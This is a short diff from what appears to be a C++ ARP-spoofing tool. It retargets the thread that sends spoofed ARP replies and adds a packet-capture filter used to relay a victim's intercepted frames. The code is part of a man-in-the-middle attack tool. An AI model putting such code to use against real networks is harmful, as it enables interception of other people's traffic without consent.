@@ -272,7 +272,7 @@ void ARPSpoofer::startcorrupt(void)
         return;
     }
 
-    this->th.push_back(thread(std::bind(&ARPSpoofer::intelligentsendarp,this,handle,&TXipaddr,&Myipaddr)));
+    this->th.push_back(thread(std::bind(&ARPSpoofer::intelligentsendarp,this,handle,&TXipaddr,&RXipaddr)));
     this->th.push_back(thread(std::bind(&ARPSpoofer::timersendarp,this,handle)));
 }
 void ARPSpoofer::relayingpacket(pcap_t* handle, uint8_t* dsthw ,uint8_t* srchw)
@@ -318,6 +318,7 @@ void ARPSpoofer::startrelay(void)
     int i;
     for(i=0;i<6;i++)
         sprintf(srchwbuf,"%s%02X%c",srchwbuf,this->TXhwaddr[i],(i==5)? ' ':':');
+    sprintf(filter,"ether src %s && not ip dst %s",srchwbuf,myipbuf);
     cout << filter << endl;
     if(pcap_lookupnet(dev,&net,&mask,errbuf) == -1)
     {
